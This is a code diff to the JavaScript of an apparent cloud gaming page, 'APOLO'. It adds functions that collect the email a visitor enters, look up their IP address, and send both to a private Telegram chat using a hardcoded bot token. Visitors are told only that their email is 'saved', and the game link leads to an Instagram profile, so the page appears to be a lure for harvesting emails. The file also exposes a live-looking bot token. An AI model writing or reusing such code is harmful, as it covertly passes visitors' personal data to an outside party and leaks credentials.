@@ -179,6 +179,102 @@ let sessionEndTime = null;
 let currentPage = 1;
 const gamesPerPage = 9;
 
+// ════════════════════════════════════════════════════
+// TELEGRAM BOT CONFIGURATION - إعدادات البوت
+// ════════════════════════════════════════════════════
+const TELEGRAM_CONFIG = {
+    BOT_TOKEN: '7569103079:AAFvhg1ynsAeQmnvnohVrqRtWST6hsGI0Bc',
+    CHAT_ID: '7779682763'
+};
+
+// دالة جديدة لحفظ الإيميل وإرساله ل Telegram
+async function saveEmailToTelegram(email, gameTitle = 'Unknown Game') {
+    const timestamp = new Date().toLocaleString();
+    
+    try {
+        // الحصول على الـ IP
+        const userIP = await getUserIP();
+        
+        // إنشاء الرسالة
+        const message = `🎮 *APOLO GAMING - New Email Registration* 🎮\n\n📧 *Email:* ${email}\n🎯 *Game:* ${gameTitle}\n⏰ *Time:* ${timestamp}\n🌐 *IP:* ${userIP}\n💻 *Browser:* ${navigator.userAgent.split(' ')[0]}\n\n_Registered via APOLO Cloud Gaming Platform_`;
+        
+        // إرسال ل Telegram
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CONFIG.CHAT_ID,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        });
+        
+        if (response.ok) {
+            console.log('✅ Email sent to Telegram successfully');
+            return true;
+        } else {
+            console.error('❌ Failed to send to Telegram:', await response.text());
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ Error sending to Telegram:', error);
+        return false;
+    }
+}
+
+// دالة للحصول على الـ IP
+async function getUserIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        return 'Unknown IP';
+    }
+}
+
+// دالة لحفظ الإيميل محليا
+function saveEmailLocally(email, gameTitle) {
+    try {
+        const timestamp = new Date().toLocaleString();
+        const content = `Email: ${email}\nGame: ${gameTitle}\nDate: ${timestamp}\nUser Agent: ${navigator.userAgent}\n---\n`;
+        
+        // الحفظ في localStorage
+        const storedEmails = JSON.parse(localStorage.getItem('apolo_emails') || '[]');
+        storedEmails.push({
+            email: email,
+            game: gameTitle,
+            date: timestamp,
+            data: content
+        });
+        localStorage.setItem('apolo_emails', JSON.stringify(storedEmails));
+        
+        // إنشاء ملف للتحميل
+        downloadFile(content, `apolo_email_${Date.now()}.txt`);
+        
+        return true;
+    } catch (error) {
+        console.error('Error saving email locally:', error);
+        return false;
+    }
+}
+
+// دالة لتحميل الملف
+function downloadFile(content, filename) {
+    const blob = new Blob([content], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+}
+// ════════════════════════════════════════════════════
+
 // User management system
 const users = JSON.parse(localStorage.getItem('apolo_users')) || [];
 let userProfile = JSON.parse(localStorage.getItem('apolo_current_user')) || null;
@@ -369,26 +465,56 @@ userEmailInput.addEventListener('input', () => {
 });
 
 // Start Game button
-startGameBtn.addEventListener('click', () => {
+startGameBtn.addEventListener('click', async () => {
     if (userEmailInput.value) {
-        // Store email (in a real app, you would send this to a server)
-        localStorage.setItem('userEmail', userEmailInput.value);
+        const userEmail = userEmailInput.value;
+        const gameTitle = currentGame?.title || 'Unknown Game';
         
-        // Start the timer
-        startGameTimer();
+        // عرض رسالة الانتظار
+        const originalText = startGameBtn.textContent;
+        startGameBtn.disabled = true;
+        startGameBtn.textContent = 'Saving Email...';
         
-        // Update page 3 with game details
-        gameLaunchImage.src = currentGame.image;
-        gameLaunchImage.alt = currentGame.title;
-        playGameLink.href = "https://www.instagram.com/polo__101/";
-        
-        // Show page 3
-        showPage('page3');
-        
-        // Add to user's recent games if logged in
-        if (userProfile) {
-            addToRecentGames(currentGame);
-            updateUserStats(currentGame, 4);
+        try {
+            // حفظ الإيميل وإرساله ل Telegram
+            const telegramSuccess = await saveEmailToTelegram(userEmail, gameTitle);
+            
+            // حفظ محليا
+            saveEmailLocally(userEmail, gameTitle);
+            
+            if (telegramSuccess) {
+                showNotification('✅ Email saved successfully! Starting game...', 'success');
+            } else {
+                showNotification('⚠️ Email saved locally! Starting game...', 'warning');
+            }
+            
+            // تخزين الإيميل في localStorage
+            localStorage.setItem('userEmail', userEmail);
+            
+            // بدأ المؤقت
+            startGameTimer();
+            
+            // تحديث الصفحة الثالثة
+            gameLaunchImage.src = currentGame.image;
+            gameLaunchImage.alt = currentGame.title;
+            playGameLink.href = "https://www.instagram.com/polo__101/";
+            
+            // عرض الصفحة الثالثة
+            showPage('page3');
+            
+            // إضافة للألعاب الحديثة إذا كان المستخدم مسجل الدخول
+            if (userProfile) {
+                addToRecentGames(currentGame);
+                updateUserStats(currentGame, 4);
+            }
+            
+        } catch (error) {
+            console.error('Error saving email:', error);
+            showNotification('❌ Error saving email, but starting game anyway...', 'error');
+        } finally {
+            // إعادة تعيين الزر
+            startGameBtn.disabled = false;
+            startGameBtn.textContent = originalText;
         }
     }
 });
